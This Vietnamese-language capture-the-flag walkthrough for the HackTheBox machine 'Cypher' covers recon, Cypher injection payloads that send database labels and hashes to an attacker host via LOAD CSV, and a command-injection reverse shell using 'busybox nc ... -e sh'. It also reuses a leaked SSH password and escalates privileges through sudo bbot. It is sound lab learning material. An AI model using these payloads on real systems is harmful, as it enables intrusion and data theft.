![image](https://hackmd.io/_uploads/Skd2s5-o1g.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/Cypher)

## Comment
Máy hay mà lắm rabbit hole

# Recon
## nmap
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -n -sS 10.10.11.57        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 20:10 EST
Nmap scan report for 10.10.11.57
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds                                                    

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -p22,80 -sCV 10.10.11.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 20:11 EST
Nmap scan report for 10.10.11.57 (10.10.11.57)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
```
Add domain vào `/etc/hosts`
```
echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```
## Gobuster 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u cypher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 4562]
/about                (Status: 200) [Size: 4986]
/login                (Status: 200) [Size: 3671]
/demo                 (Status: 307) [Size: 0] [--> /login]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
```

## /testing
![image](https://hackmd.io/_uploads/ryr9pFbokl.png)

Còn lại web chỉ có thể vào bằng `/login`

![image](https://hackmd.io/_uploads/HkrBJ5-jye.png)

# User flag
## Decompile .jar
Unzip `.jar` như unzip folder 

Sau đó decompile file để đọc code
```
┌──(kali㉿kali)-[~/…/com/cypher/neo4j/apoc]
└─$ java -jar cfr.jar CustomFunctions.class > CustomFunctions.java
```

Nếu chưa có `cfr.jar` ta dùng lệnh sau
```
┌──(kali㉿kali)-[~/…/com/cypher/neo4j/apoc]
└─$ wget https://www.benf.org/other/cfr/cfr-0.152.jar -O cfr.jar
```

![image](https://hackmd.io/_uploads/By3rAtZjkg.png)

## Cypher Injection
### Phân tích source 
Các file kia đều được gọi đến nên ta sẽ tập trung file `CustomFunctions.java`

![image](https://hackmd.io/_uploads/Bk-m15WiJl.png)

Ngay từ đầu hàm sink đã đập vào mắt với việc có thể inject trực tiếp vào bằng cách nối(separator) vào mà không hề bị filter gì. Lối đi sẽ như thế này

![image](https://hackmd.io/_uploads/S1uLZ9bjJl.png)

Điều quan trọng là `(String)url` được inject vào bằng cách nào. 

### Leak thông tin từ query.
Ban đầu mình có phát hiện được lỗ hổng **Cypher Injection** khi nó đã trả về mã lỗi 

![image](https://hackmd.io/_uploads/r1w8GcWsyg.png)

Lỗi này hiển thị sẽ được dùng bên dưới

![image](https://hackmd.io/_uploads/BySeRq-syg.png)

Sau đó mình ốp payload này vào. Payload tham khảo [ở đây](https://pentester.land/blog/cypher-injection-cheatsheet/) sau đó dùng gpt (nay có gpt nó lạ lắm : ) hỏi gì cũng trả lời )
```
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.x.x:8888/?label=' + label as l RETURN 0 //
```

![image](https://hackmd.io/_uploads/HyR4TVWs1e.png)

Tiếp theo là leak note (giống như các giá trị ở cột trong sql)
```
' OR 1=1 WITH 1 as a MATCH (n:HASH) LOAD CSV FROM "http://10.10.x.x:8888/?hash=" + n.hash AS l RETURN 0 //
```

![image](https://hackmd.io/_uploads/Syh77q-i1l.png)

Tưởng đến đây là ngon ăn thì cái hash không crack được, lại quay lại từ đầu, ít nhất cũng biết được username, hết.

### Lợi dụng procedures để dẫn lối RCE
>Procedures (thủ tục) là các hàm mở rộng viết bằng Java, được thêm vào Neo4j thông qua plugin mục đích dev có thể nhận tham số từ truy vấn Cypher và thực hiện các hành động phức tạp, kể cả tương tác với hệ điều hành.

Để trả lời cho câu hỏi ở trên, đây chính là đường dẫn đến việc ta có thể inject code vào

```
custom.getUrlStatusCode("http://cypher.htb; nc 10.10.x.x 4444 -e /bin/sh;#")
```

Để gọi được hàm này ta sẽ dùng query sau
```
a' return h.value as a UNION CALL custom.getUrlStatusCode("http://cypher.htb;busybox nc 10.10.x.x 4444 -e sh;#") YIELD statusCode AS a RETURN a;// 
```
- `a' return h.value as a` để kết thúc câu lệnh hiện tại 
![image](https://hackmd.io/_uploads/BkD1A5WjJx.png)
- `UNION CALL custom.getUrlStatusCode("http://cypher.htb;busybox nc 10.10.x.x 4444 -e sh;#")` sẽ gọi `getUrlStatusCode()` và inject payload vào
- `YIELD statusCode AS a RETURN a;//` trả về status code để tránh lỗi cú pháp Cypher

![image](https://hackmd.io/_uploads/ByYHkjZiyl.png)


Việc đọc `user.txt` vẫn chưa được và cần phải nhảy sang user `graphasm`

![image](https://hackmd.io/_uploads/BkSTF9Wj1g.png)

## Lateral Movement
Để cho phiên không bị hết, ssh bằng credential ở file `bbot_scans.yaml`

![image](https://hackmd.io/_uploads/SJ6E59-oye.png)

Lỏ luôn 

Tuy nhiên "ý đồ" là khi thay đó bằng user `graphasm` thì ssh được =)). `graphasm:cU4btyib.20xtCMCXkBm`

![image](https://hackmd.io/_uploads/S1ot9q-iJl.png)

Done
:::spoiler User flag
```
graphasm@cypher:~$ cat user.txt 
719b9ad53e9de77c9c27******
```
:::

# Root flag
## sudo -l 
Từ việc dùng `sudo -l`, có thể lợi dung `bbot` để leo quyền
```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

> bbot là viết tắt của Bug Bounty Bot, đây là một công cụ automation dùng để thu thập thông tin (OSINT), reconnaissance, hỗ trợ cho pentest hoặc bug bounty.

[Cheatsheet](https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/) về tool này 

Cách tấn công là lợi dụng option `-cy` để nạp file quét sau đó dùng chế độ debug `-d` để hiển thị những gì nó sẽ làm 
```
sudo /usr/local/bin/bbot -cy /root/root.txt -d
```

Flag sẽ thấy ở việc chạy debug. Hoàn thành machine. 

:::spoiler Root flag
```
DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: ecc4254818505c5edb8b06******
```
:::

------------------------------------------ Cypher has been Pwned! ------------------------------------------

![image](https://hackmd.io/_uploads/ryJSh9-j1e.png)
